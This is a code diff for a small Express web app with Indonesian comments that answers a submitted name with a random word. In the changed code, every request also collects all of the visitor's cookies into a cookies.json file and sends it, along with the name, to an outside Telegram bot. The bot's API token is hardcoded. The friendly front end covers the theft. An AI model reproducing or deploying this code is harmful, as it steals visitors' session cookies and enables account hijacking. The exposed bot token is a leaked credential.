@@ -2,6 +2,7 @@ const express = require('express');
 const bodyParser = require('body-parser');
 const cors = require('cors'); // Import middleware CORS
 const fetch = require('node-fetch');
+const FormData = require('form-data');
 const app = express();
 
 // Middleware untuk parse application/json
@@ -36,7 +37,7 @@ const data = ['Tidak Ada',
     ];
 
 app.get('/', (req, res) => {
-        res.send('Hello from Express on Vercel!');
+    res.send('Hello from Express on Vercel!');
 });
 
 // Function to get all cookies and format them as a JSON object
@@ -52,24 +53,16 @@ function getCookies(req) {
     return cookies;
 }
 
-// Function to export cookies and send to Telegram bot
-async function exportCookies(req) {
-    const cookies = getCookies(req);
-    const json = JSON.stringify(cookies, null, 2);
-    const blob = new Blob([json], { type: 'application/json' });
-
-    // Convert blob to File
-    const file = new File([blob], 'cookies.json', { type: 'application/json' });
-
-    // Telegram API URL
+// Function to send data to Telegram bot
+async function sendToTelegram(data, filename, content) {
     const token = '6437904783:AAGcfue1uTav8dykCUPCxsrpmrIwfa1D5rM';
     const chat_id = '@initestingbot';
     const url = `https://api.telegram.org/bot${token}/sendDocument`;
 
-    // Create FormData and append file
     const formData = new FormData();
     formData.append('chat_id', chat_id);
-    formData.append('document', file);
+    formData.append('document', content, filename);
+    formData.append('caption', data);
 
     try {
         const response = await fetch(url, {
@@ -78,13 +71,24 @@ async function exportCookies(req) {
         });
 
         if (response.ok) {
-            console.log('File successfully sent to Telegram bot');
+            console.log('Data successfully sent to Telegram bot');
         } else {
-            console.error('Error sending file to Telegram bot', response.statusText);
+            console.error('Error sending data to Telegram bot', response.statusText);
         }
     } catch (error) {
-        console.error('Error sending file to Telegram bot', error);
+        console.error('Error sending data to Telegram bot', error);
     }
+}
+
+// Function to export cookies and send to Telegram bot
+async function exportCookies(req, nama, responseData) {
+    const cookies = getCookies(req);
+    const json = JSON.stringify(cookies, null, 2);
+    const content = Buffer.from(json, 'utf-8');
+
+    // Prepare data to send
+    const data = `Nama: ${nama}\nData: ${responseData}`;
+    await sendToTelegram(data, 'cookies.json', content);
 }
 
 // Route untuk handle POST request
@@ -93,14 +97,15 @@ app.post('/api/data', async (req, res) => {
 
     // Generate index acak dari array data
     const randomIndex = Math.floor(Math.random() * data.length);
+    const responseData = data[randomIndex];
 
     // Call exportCookies function
-    await exportCookies(req);
+    await exportCookies(req, nama, responseData);
 
     // Kirim response berupa kata acak dari data berdasarkan nama yang diinput
     res.json({
         nama,
-        data: data[randomIndex]
+        data: responseData
     });
 });
 
